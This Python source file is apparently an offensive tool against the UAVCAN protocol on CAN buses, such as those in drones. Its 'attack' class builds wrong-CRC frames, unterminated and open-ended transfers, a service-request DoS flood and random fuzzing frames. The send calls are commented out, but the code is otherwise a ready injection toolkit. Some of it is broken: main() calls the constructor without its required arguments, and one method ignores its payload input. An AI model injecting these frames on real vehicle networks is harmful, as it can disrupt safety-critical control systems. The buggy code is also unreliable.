from UAVCAN.AID     import UAVCAN_AID
from UAVCAN.PAYLOAD import UAVCAN_PAYLOAD

# pip3 install python-can
import can
import os
import random
import struct


class attack:
    def __init__(self, bus, data):
        self.AID        = UAVCAN_AID()
        self.bus        = bus
        # can.rc['interface'] = 'socketcan_native'

        with open(data) as f: lines = f.readlines()

        aids_service = set()
        aids_else = set()
        for aid in [ int(_.split()[2], 16) for _ in lines ]:
            if self.AID.get_value(aid, 1, 7): # is service?
                aids_service.add(aid)
            else:
                aids_else.add(aid)
        '''
        for aid in aids_service:
            print(f'AID={aid:#010x}', end=' ==> ')
            self.AID.dissect_aid_service(aid)
        print()
        '''
        self.aids_service   = list(aids_service)
        self.aids_else      = list(aids_else)


    # send multiframe message with wrong CRC
    def wrong_CRC(self, CRC = 'AA AA', payload = 'BB BB BB BB', padding = True):
        payload = CRC.split(' ') + payload.split(' ')

        transfer_start  = 0b1
        transfer_end    = 0b0
        toggle          = 0b0
        transfer_ID     = 0b00000

        if len(payload) < 7:
            if padding: payload += ["00" for _ in range(5 - len(payload))]
            msg = can.Message(
                arbitration_id=10015501,
                extended_id=True,
                data=bytearray.fromhex(' '.join(payload))
            )
            print(msg)
            # self.bus.send(msg)
        else:
            msg = can.Message(
                arbitration_id=10015501,
                extended_id=True,
                data=bytearray.fromhex(
                    ' '.join(payload[ : 7 ] + 
                    [ UAVCAN_PAYLOAD.tail(
                        transfer_start, 
                        transfer_end, 
                        toggle, 
                        transfer_ID
                    ) ] )
                )
            )
            print(msg)
            # self.bus.send(msg)
            payload = payload[ 7 : ]

            transfer_start  = 0b0
            while len(payload) > 7:
                toggle ^= 0b1
                msg = can.Message(
                    arbitration_id=10015501,
                    extended_id=True,
                    data=bytearray.fromhex(
                        ' '.join(payload[ : 7 ] +
                        [ UAVCAN_PAYLOAD.tail(
                            transfer_start, 
                            transfer_end, 
                            toggle, 
                            transfer_ID
                        ) ] )
                    )
                )
                print(msg)
                # self.bus.send(msg)

                payload = payload[ 7 : ]

            transfer_end = 0b1
            toggle ^= 0b1
            msg = can.Message(
                arbitration_id=10015501,
                is_extended_id=True,
                data=bytearray.fromhex(
                        ' '.join(payload +
                        [ UAVCAN_PAYLOAD.tail(
                            transfer_start, 
                            transfer_end, 
                            toggle, 
                            transfer_ID
                        ) ] )
                    )
            )
            print(msg)
            # self.bus.send(msg)

        print()

    def wrong_CRC_test(self):
        print("''' wrong CRC attack sample input '''")
        self.wrong_CRC('A1 A2', 'C1', False)    
        self.wrong_CRC('A1 A2', 'C1 C2')
        self.wrong_CRC('A1 A2', 'C1 C2 C3')
        self.wrong_CRC('A1 A2', 'C1 C2 C3 C4')
        self.wrong_CRC('A1 A2', 'C1 C2 C3 C4 C5')

        self.wrong_CRC('A1 A2', 'B1 B2 B3 B4 B5 B6')
        self.wrong_CRC('A1 A2', 'B1 B2 B3 B4 B5 B6 B7')

        self.wrong_CRC('A1 A2', 'B1 B2 B3 B4 B5 B6 B7 B8 B9 B0 B0 B0')
        self.wrong_CRC('A1 A2', 'B1 B2 B3 B4 B5 B6 B7 B8 B9 B0 B0 B0 B0')

        self.wrong_CRC('A1 A2', 'B1 B2 B3 B5 B5 B6 B7 B8 B9 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0')

    # send singleframe message with open end
    def wrong_END(self, payload = None, padding = True, counter = -1):
        while counter:
            payload = [ '{:02X}'.format(_) for _ in os.urandom(random.randint(0, 7)) ]

            if padding: payload += ["00" for _ in range(7 - len(payload))]
            msg = can.Message(
                arbitration_id  = random.choice(self.aids_else),
                is_extended_id  = True,
                data            = bytearray.fromhex( ' '.join(payload + [ UAVCAN_PAYLOAD(transfer_end = 0b0).get_tail() ] ) )
            )
            print(msg)
            # self.bus.send(msg)
            if counter != -1: counter -= 1

    def wrong_END_test(self):
        print("''' wrong end attack sample input '''")
        self.wrong_END('C1', False)    
        self.wrong_END('C1 C2')
        self.wrong_END('C1 C2 C3')
        self.wrong_END('C1 C2 C3 C4')
        self.wrong_END('C1 C2 C3 C4 C5')

        self.wrong_END('B1 B2 B3 B4 B5 B6')
        self.wrong_END('B1 B2 B3 B4 B5 B6 B7')

    # send multiframe message without termination
    def nonTERMINATE(self, counter = -1):
        print("''' non terminate attack '''")

        U_PAYLOAD = UAVCAN_PAYLOAD(transfer_end = 0b0)

        aid = random.choice(self.aids_else)
        msg = can.Message(
            arbitration_id  = aid,
            is_extended_id  = True,
            data            = bytearray.fromhex( UAVCAN_PAYLOAD.random() + U_PAYLOAD.get_tail() )
        )
        print(msg)
        # self.bus.send(msg)

        U_PAYLOAD.transfer_start = 0b0
        while counter:
            U_PAYLOAD.toggle ^= 0b1
            msg = can.Message(
                arbitration_id  = aid,
                is_extended_id  = True,
                data            = bytearray.fromhex( UAVCAN_PAYLOAD.random() + U_PAYLOAD.get_tail() )
            )
            print(msg)
            # self.bus.send(msg)
            if counter != -1: counter -= 1

    def DoS(self, counter = -1):
        while counter:
            for destination_node_id in range(122, 126):
                aid = self.AID.get_aid_service(
                    priority            = 30,
                    service_id          = 1,
                    is_request          = 1,
                    destination_node_id = destination_node_id,
                    is_service          = 1,
                    source_node_id      = 1
                )
                msg = can.Message(
                    arbitration_id  = aid, 
                    extended_id     = True, 
                    data            = b'\xc0'
                )
                print(msg)
                # self.bus.send(msg)
                if counter != -1: counter -= 1

    def Fuzz(self, counter = -1):
        while counter:
            msg = can.Message(
                arbitration_id  = random.choice(self.aids_else), 
                extended_id     = True, 
                data            = os.urandom(random.randint(0, 7)) + \
                                  bytearray.fromhex( UAVCAN_PAYLOAD(transfer_ID = random.randint(0, 2**5-1)).get_tail() )
            )
            print(msg)
            # self.bus.send(msg)
            if counter != -1: counter -= 1


def main():
    attack().wrong_CRC_test()
    attack().wrong_END_test()

    # attack().nonTERMINATE()
    attack().nonTERMINATE(10)

    print(UAVCAN_AID().dissect_aid_service(10015501))


if __name__ == "__main__":
    main()